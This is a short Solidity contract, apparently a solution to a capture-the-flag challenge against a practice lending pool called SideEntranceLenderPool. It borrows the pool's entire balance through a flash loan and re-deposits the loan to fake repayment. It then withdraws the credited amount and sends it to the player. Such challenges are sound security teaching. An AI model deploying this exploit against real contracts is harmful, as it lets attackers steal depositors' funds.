// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract Attacker{
    address player;
    SideEntranceLenderPool pool;


    constructor(address _pool){
        pool = SideEntranceLenderPool(_pool);
        player = msg.sender;
    }

    function attack() external{
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    function execute() external payable{
        pool.deposit{value:msg.value}();
    }

    receive() external payable{
        payable(player).transfer(address(this).balance);
    }
}